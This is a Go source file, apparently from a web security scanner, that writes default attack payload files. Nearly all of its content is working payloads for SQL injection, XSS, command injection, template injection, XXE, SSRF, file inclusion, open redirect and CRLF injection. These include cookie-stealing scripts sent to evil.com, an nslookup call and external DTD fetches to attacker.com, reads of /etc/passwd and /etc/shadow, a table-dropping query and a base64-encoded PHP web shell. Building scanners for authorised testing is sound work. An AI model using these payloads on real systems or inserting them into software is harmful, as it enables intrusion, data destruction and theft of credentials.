package payload

import (
	"fmt"
	"os"
	"path/filepath"
)

const payloadDir = ".fang/payloads"

func createDefaultPayloads(dir string) error {
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create payload directory: %w", err)
	}

	for filename, content := range defaultPayloads {
		path := filepath.Join(dir, filename)
		if _, err := os.Stat(path); err == nil {
			continue
		}
		if err := os.WriteFile(path, []byte(content), 0644); err != nil {
			return fmt.Errorf("failed to write %s: %w", filename, err)
		}
	}

	return nil
}

var defaultPayloads = map[string]string{
	"sql_injection.yaml": `name: sql_injection
vuln_type: sqli
payloads:
  - id: sqli-001
    value: "' OR '1'='1"
    tags: ["error-based", "basic"]
  - id: sqli-002
    value: "' OR 1=1--"
    tags: ["error-based", "basic"]
  - id: sqli-003
    value: "\" OR 1=1--"
    tags: ["error-based", "basic"]
  - id: sqli-004
    value: "UNION SELECT NULL,NULL,NULL--"
    tags: ["union-based"]
  - id: sqli-005
    value: "' UNION SELECT @@version--"
    tags: ["union-based", "mssql"]
  - id: sqli-006
    value: "' AND SLEEP(5)--"
    tags: ["time-based", "mysql"]
  - id: sqli-007
    value: "' OR SLEEP(5)--"
    tags: ["time-based", "mysql"]
  - id: sqli-008
    value: "' AND 1=1--"
    tags: ["boolean-blind"]
  - id: sqli-009
    value: "' AND 1=2--"
    tags: ["boolean-blind"]
  - id: sqli-010
    value: "1' ORDER BY 1--"
    tags: ["union-based"]
  - id: sqli-011
    value: "' OR '1'='1' /*"
    tags: ["error-based", "mysql"]
  - id: sqli-012
    value: "'; DROP TABLE users--"
    tags: ["error-based", "stacked"]
  - id: sqli-013
    value: "'; WAITFOR DELAY '00:00:05'--"
    tags: ["time-based", "mssql"]
  - id: sqli-014
    value: "' OR pg_sleep(5)--"
    tags: ["time-based", "postgresql"]
  - id: sqli-015
    value: "\" OR 1=1 #"
    tags: ["error-based", "mysql"]
  - id: sqli-016
    value: "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--"
    tags: ["union-based", "mysql"]
  - id: sqli-017
    value: "1 AND 1=1"
    tags: ["boolean-blind", "numeric"]
  - id: sqli-018
    value: "1' || 1==1 //"
    tags: ["nosql", "mongodb"]
  - id: sqli-019
    value: "';return true;var foo='bar"
    tags: ["nosql", "mongodb"]
  - id: sqli-020
    value: "' UNI/**/ON SEL/**/ECT 1,2,3--"
    tags: ["union-based", "waf-bypass"]
`,
	"xss.yaml": `name: cross_site_scripting
vuln_type: xss
payloads:
  - id: xss-001
    value: "<script>alert(1)</script>"
    tags: ["reflected", "basic"]
  - id: xss-002
    value: "<img src=x onerror=alert(1)>"
    tags: ["reflected", "event-handler"]
  - id: xss-003
    value: "\"><script>alert(1)</script>"
    tags: ["reflected", "attr-breakout"]
  - id: xss-004
    value: "'><script>alert(1)</script>"
    tags: ["reflected", "attr-breakout"]
  - id: xss-005
    value: "<svg onload=alert(1)>"
    tags: ["reflected", "svg"]
  - id: xss-006
    value: "javascript:alert(1)"
    tags: ["reflected", "url"]
  - id: xss-007
    value: "<body onload=alert(1)>"
    tags: ["reflected", "event-handler"]
  - id: xss-008
    value: "<input onfocus=alert(1) autofocus>"
    tags: ["reflected", "event-handler"]
  - id: xss-009
    value: "<details open ontoggle=alert(1)>"
    tags: ["reflected", "event-handler"]
  - id: xss-010
    value: "';alert(1)//"
    tags: ["reflected", "js-context"]
  - id: xss-011
    value: "\"onmouseover=\"alert(1)"
    tags: ["reflected", "attr-context"]
  - id: xss-012
    value: "<script>eval(atob('YWxlcnQoMSk='))</script>"
    tags: ["reflected", "obfuscated"]
  - id: xss-013
    value: "<script>document.location='http://evil.com/?c='+document.cookie</script>"
    tags: ["stored", "cookie-steal"]
  - id: xss-014
    value: "<iframe src=javascript:alert(1)>"
    tags: ["reflected", "iframe"]
  - id: xss-015
    value: "<object data=javascript:alert(1)>"
    tags: ["reflected", "object"]
  - id: xss-016
    value: "<script>new Image().src='http://evil.com/?c='+document.cookie</script>"
    tags: ["stored", "cookie-steal"]
  - id: xss-017
    value: "\"onclick=alert(1)><svg onload=alert(1)><script>alert(1)</script>"
    tags: ["polyglot"]
  - id: xss-018
    value: "{{constructor.constructor('alert(1)')()}}"
    tags: ["dom", "js-context"]
  - id: xss-019
    value: "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>"
    tags: ["reflected", "mathml-bypass"]
  - id: xss-020
    value: "1\"><script>alert(1)</script>"
    tags: ["reflected", "numeric-param"]
`,
	"command_injection.yaml": `name: command_injection
vuln_type: cmdi
payloads:
  - id: cmdi-001
    value: "; ls"
    tags: ["unix", "basic"]
  - id: cmdi-002
    value: "| ls"
    tags: ["unix", "basic"]
  - id: cmdi-003
    value: "&& ls"
    tags: ["unix", "basic"]
  - id: cmdi-004
    value: "|| ls"
    tags: ["unix", "basic"]
  - id: cmdi-005
    value: "$(ls)"
    tags: ["unix", "subshell"]
  - id: cmdi-006
    value: "$(cat /etc/passwd)"
    tags: ["unix", "subshell"]
  - id: cmdi-007
    value: "; cat /etc/passwd"
    tags: ["unix", "file-read"]
  - id: cmdi-008
    value: "| cat /etc/passwd"
    tags: ["unix", "file-read"]
  - id: cmdi-009
    value: "&& whoami"
    tags: ["unix", "info-gathering"]
  - id: cmdi-010
    value: "; sleep 5"
    tags: ["unix", "time-based"]
  - id: cmdi-011
    value: "| sleep 5"
    tags: ["unix", "time-based"]
  - id: cmdi-012
    value: "&& sleep 5"
    tags: ["unix", "time-based"]
  - id: cmdi-013
    value: "$(sleep 5)"
    tags: ["unix", "time-based", "subshell"]
  - id: cmdi-014
    value: "\"||sleep 5||"
    tags: ["unix", "time-based", "oracle"]
  - id: cmdi-015
    value: "| dir"
    tags: ["windows", "basic"]
  - id: cmdi-016
    value: "& whoami"
    tags: ["windows", "info-gathering"]
  - id: cmdi-017
    value: "| ping -n 5 127.0.0.1"
    tags: ["windows", "time-based"]
  - id: cmdi-018
    value: "& ping -n 5 127.0.0.1 &"
    tags: ["windows", "time-based"]
  - id: cmdi-019
    value: "%0A ls"
    tags: ["unix", "newline-injection"]
  - id: cmdi-020
    value: "| nslookup attacker.com"
    tags: ["unix", "oob"]
`,
	"ssti.yaml": `name: server_side_template_injection
vuln_type: ssti
payloads:
  - id: ssti-001
    value: "{{7*7}}"
    tags: ["jinja2", "twig", "detect"]
  - id: ssti-002
    value: "${7*7}"
    tags: ["freemarker", "detect"]
  - id: ssti-003
    value: "#{7*7}"
    tags: ["jade", "detect"]
  - id: ssti-004
    value: "*{7*7}"
    tags: ["velocity", "detect"]
  - id: ssti-005
    value: "{{config}}"
    tags: ["jinja2", "info-leak"]
  - id: ssti-006
    value: "{{7*'7'}}"
    tags: ["jinja2", "detect"]
  - id: ssti-007
    value: "<%= 7*7 %>"
    tags: ["erb", "detect"]
  - id: ssti-008
    value: "{{''.__class__.__mro__[2].__subclasses__()}}"
    tags: ["jinja2", "rce"]
  - id: ssti-009
    value: "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}"
    tags: ["jinja2", "file-read"]
  - id: ssti-010
    value: "{% include '/etc/passwd' %}"
    tags: ["jinja2", "file-read"]
  - id: ssti-011
    value: "{{ ''.__class__.__mro__[1].__subclasses__() }}"
    tags: ["jinja2", "rce"]
  - id: ssti-012
    value: "${7*7}"
    tags: ["freemarker", "detect"]
  - id: ssti-013
    value: "${7*'7'}"
    tags: ["freemarker", "detect"]
  - id: ssti-014
    value: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
    tags: ["freemarker", "rce"]
  - id: ssti-015
    value: "#{7*7}"
    tags: ["jade", "detect"]
  - id: ssti-016
    value: "*{7*7}"
    tags: ["velocity", "detect"]
  - id: ssti-017
    value: "#set($x=7*7)$x"
    tags: ["velocity", "detect"]
  - id: ssti-018
    value: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
    tags: ["twig", "rce"]
  - id: ssti-019
    value: "{{['id']|filter('system')}}"
    tags: ["twig", "rce"]
  - id: ssti-020
    value: "{{7*7}}"
    tags: ["generic", "detect"]
`,
	"xxe.yaml": `name: xml_external_entity
vuln_type: xxe
payloads:
  - id: xxe-001
    value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe \"test\">]><root>&xxe;</root>"
    tags: ["basic", "in-band"]
  - id: xxe-002
    value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
    tags: ["file-read", "in-band"]
  - id: xxe-003
    value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><root>&xxe;</root>"
    tags: ["oob", "ssrf"]
  - id: xxe-004
    value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]>"
    tags: ["blind", "parameter-entity"]
  - id: xxe-005
    value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>"
    tags: ["blind", "oob", "dtd"]
  - id: xxe-006
    value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]>"
    tags: ["blind", "oob", "parameter-entity"]
  - id: xxe-007
    value: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><root>&xxe;</root>"
    tags: ["php", "file-read"]
  - id: xxe-008
    value: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><root>&xxe;</root>"
    tags: ["file-read", "linux"]
  - id: xxe-009
    value: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><root>&xxe;</root>"
    tags: ["rce", "expect"]
  - id: xxe-010
    value: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>"
    tags: ["ssrf", "cloud-metadata"]
  - id: xxe-011
    value: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><root>&xxe;</root>"
    tags: ["file-read", "info-leak"]
  - id: xxe-012
    value: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><root>&xxe;</root>"
    tags: ["file-read", "info-leak"]
  - id: xxe-013
    value: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"gopher://localhost:6379/_*1%0d%0a$4%0d%0asave\">]><root>&xxe;</root>"
    tags: ["ssrf", "gopher"]
  - id: xxe-014
    value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///dev/random\">%xxe;]>"
    tags: ["blind", "dos"]
  - id: xxe-015
    value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
    tags: ["file-read", "in-band"]
`,
	"ssrf.yaml": `name: server_side_request_forgery
vuln_type: ssrf
payloads:
  - id: ssrf-001
    value: "http://127.0.0.1:80"
    tags: ["internal", "localhost"]
  - id: ssrf-002
    value: "http://127.0.0.1:8080"
    tags: ["internal", "localhost"]
  - id: ssrf-003
    value: "http://127.0.0.1:443"
    tags: ["internal", "localhost"]
  - id: ssrf-004
    value: "http://localhost:80"
    tags: ["internal", "localhost"]
  - id: ssrf-005
    value: "http://[::1]:80"
    tags: ["internal", "ipv6"]
  - id: ssrf-006
    value: "http://0.0.0.0:80"
    tags: ["internal"]
  - id: ssrf-007
    value: "http://0:80"
    tags: ["internal", "short"]
  - id: ssrf-008
    value: "http://169.254.169.254/latest/meta-data/"
    tags: ["cloud", "aws"]
  - id: ssrf-009
    value: "http://169.254.169.254/latest/user-data/"
    tags: ["cloud", "aws"]
  - id: ssrf-010
    value: "http://metadata.google.internal/"
    tags: ["cloud", "gcp"]
  - id: ssrf-011
    value: "http://100.100.100.200/latest/meta-data/"
    tags: ["cloud", "alibaba"]
  - id: ssrf-012
    value: "file:///etc/passwd"
    tags: ["file-protocol", "lfi"]
  - id: ssrf-013
    value: "file:///proc/self/environ"
    tags: ["file-protocol", "info-leak"]
  - id: ssrf-014
    value: "dict://localhost:11211/"
    tags: ["protocol", "redis"]
  - id: ssrf-015
    value: "gopher://localhost:6379/"
    tags: ["protocol", "redis"]
  - id: ssrf-016
    value: "http://10.0.0.1:80"
    tags: ["internal", "private"]
  - id: ssrf-017
    value: "http://172.16.0.1:80"
    tags: ["internal", "private"]
  - id: ssrf-018
    value: "http://192.168.1.1:80"
    tags: ["internal", "private"]
  - id: ssrf-019
    value: "http://127.0.0.1:3306"
    tags: ["internal", "mysql"]
  - id: ssrf-020
    value: "http://127.0.0.1:6379"
    tags: ["internal", "redis"]
`,
	"lfi.yaml": `name: local_file_inclusion
vuln_type: lfi
payloads:
  - id: lfi-001
    value: "../../../etc/passwd"
    tags: ["path-traversal", "basic"]
  - id: lfi-002
    value: "../../../../etc/passwd"
    tags: ["path-traversal", "deep"]
  - id: lfi-003
    value: "../../../../../etc/passwd"
    tags: ["path-traversal", "deep"]
  - id: lfi-004
    value: "....//....//....//etc/passwd"
    tags: ["path-traversal", "bypass"]
  - id: lfi-005
    value: "..;/..;/..;/etc/passwd"
    tags: ["path-traversal", "bypass"]
  - id: lfi-006
    value: "php://filter/read=convert.base64-encode/resource=index.php"
    tags: ["php-wrapper", "file-read"]
  - id: lfi-007
    value: "php://filter/convert.base64-encode/resource=config.php"
    tags: ["php-wrapper", "file-read"]
  - id: lfi-008
    value: "php://input"
    tags: ["php-wrapper", "rce"]
    params:
      method: POST
      body: "<?php system('id');?>"
  - id: lfi-009
    value: "expect://id"
    tags: ["php-wrapper", "rce"]
  - id: lfi-010
    value: "file:///etc/passwd"
    tags: ["file-protocol", "basic"]
  - id: lfi-011
    value: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
    tags: ["php-wrapper", "rce"]
  - id: lfi-012
    value: "/proc/self/environ"
    tags: ["proc-fs", "info-leak"]
  - id: lfi-013
    value: "/proc/1/cmdline"
    tags: ["proc-fs", "info-leak"]
  - id: lfi-014
    value: "/proc/self/fd/0"
    tags: ["proc-fs", "info-leak"]
  - id: lfi-015
    value: "/var/log/apache2/access.log"
    tags: ["log-poisoning", "apache"]
  - id: lfi-016
    value: "/var/log/nginx/access.log"
    tags: ["log-poisoning", "nginx"]
  - id: lfi-017
    value: "/etc/issue"
    tags: ["info-leak", "basic"]
  - id: lfi-018
    value: "/etc/hosts"
    tags: ["info-leak", "basic"]
  - id: lfi-019
    value: "....//....//....//....//etc/passwd"
    tags: ["path-traversal", "bypass"]
  - id: lfi-020
    value: "..%252f..%252f..%252fetc/passwd"
    tags: ["path-traversal", "double-encoding"]
`,
	"open_redirect.yaml": `name: open_redirect
vuln_type: redirect
payloads:
  - id: red-001
    value: "//evil.com"
    tags: ["protocol-relative"]
  - id: red-002
    value: "//evil.com/"
    tags: ["protocol-relative"]
  - id: red-003
    value: "/\\evil.com"
    tags: ["sla-shortcut"]
  - id: red-004
    value: "https://evil.com"
    tags: ["absolute-url"]
  - id: red-005
    value: "http://evil.com"
    tags: ["absolute-url"]
  - id: red-006
    value: "///evil.com"
    tags: ["triple-slash"]
  - id: red-007
    value: "//evil.com@good.com"
    tags: ["credential-bypass"]
  - id: red-008
    value: "https://evil.com@good.com"
    tags: ["credential-bypass"]
  - id: red-009
    value: "//evil.com:80"
    tags: ["port-variant"]
  - id: red-010
    value: "/evil.com"
    tags: ["path-variant"]
  - id: red-011
    value: "javascript:alert(1)"
    tags: ["javascript-protocol"]
  - id: red-012
    value: "data:text/html,<script>alert(1)</script>"
    tags: ["data-protocol"]
  - id: red-013
    value: "%2F%2Fevil.com"
    tags: ["encoded"]
  - id: red-014
    value: "%68%74%74%70%73%3A%2F%2Fevil.com"
    tags: ["encoded", "full"]
  - id: red-015
    value: "..;/..;/..;/"
    tags: ["path-traversal"]
  - id: red-016
    value: "\\\\evil.com"
    tags: ["backslash"]
  - id: red-017
    value: "http://evil.com%23.good.com"
    tags: ["fragment-bypass"]
  - id: red-018
    value: "http://evil.com%2F.good.com"
    tags: ["path-bypass"]
  - id: red-019
    value: "http://evil.com%3F.good.com"
    tags: ["query-bypass"]
  - id: red-020
    value: "//evil.com%2f.good.com"
    tags: ["encoded-bypass"]
`,
	"crlf.yaml": `name: crlf_injection
vuln_type: crlf
payloads:
  - id: crlf-001
    value: "%0d%0aInjected-Header: true"
    tags: ["header-injection"]
  - id: crlf-002
    value: "%0d%0aContent-Length: 0%0d%0a%0d%0a"
    tags: ["response-splitting"]
  - id: crlf-003
    value: "%0aInjected-Header: true"
    tags: ["header-injection"]
  - id: crlf-004
    value: "%0d%0aLocation: //evil.com"
    tags: ["response-splitting", "redirect"]
  - id: crlf-005
    value: "%0d%0aSet-Cookie: session=evil"
    tags: ["header-injection", "cookie"]
  - id: crlf-006
    value: "%0d%0a%0d%0a<html>injected</html>"
    tags: ["response-splitting", "body-injection"]
  - id: crlf-007
    value: "%0d%0aTransfer-Encoding: chunked"
    tags: ["header-injection", "smuggling"]
  - id: crlf-008
    value: "%0d%0aX-XSS-Protection: 0"
    tags: ["header-injection", "security"]
  - id: crlf-009
    value: "%0dSet-Cookie: session=evil"
    tags: ["header-injection", "bypass"]
  - id: crlf-010
    value: "%0aSet-Cookie: session=evil"
    tags: ["header-injection", "bypass"]
  - id: crlf-011
    value: "%0d%0aHTTP/1.0 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>injected</html>"
    tags: ["response-splitting", "full"]
  - id: crlf-012
    value: "%0d%0aRefresh: 0;url=//evil.com"
    tags: ["response-splitting", "redirect"]
  - id: crlf-013
    value: "%0d%0aContent-Disposition: attachment; filename=evil.html"
    tags: ["header-injection", "content-disposition"]
  - id: crlf-014
    value: "%0d%0aCache-Control: no-cache"
    tags: ["header-injection", "cache"]
  - id: crlf-015
    value: "%0d%0aLast-Modified: 0"
    tags: ["header-injection", "cache"]
  - id: crlf-016
    value: "%0D%0ASet-Cookie:test=1"
    tags: ["header-injection", "uppercase"]
  - id: crlf-017
    value: "%E5%98%8A%E5%98%8DSet-Cookie:test=1"
    tags: ["header-injection", "utf8-bypass"]
  - id: crlf-018
    value: "%E5%98%8A%E5%98%8DLocation: //evil.com"
    tags: ["response-splitting", "utf8-bypass"]
  - id: crlf-019
    value: "%E5%98%8A%E5%98%8D%0d%0aLocation: //evil.com"
    tags: ["response-splitting", "utf8-bypass"]
  - id: crlf-020
    value: "%E5%98%8D%E5%98%9ALocation: //evil.com"
    tags: ["response-splitting", "mojibake"]
`,
}
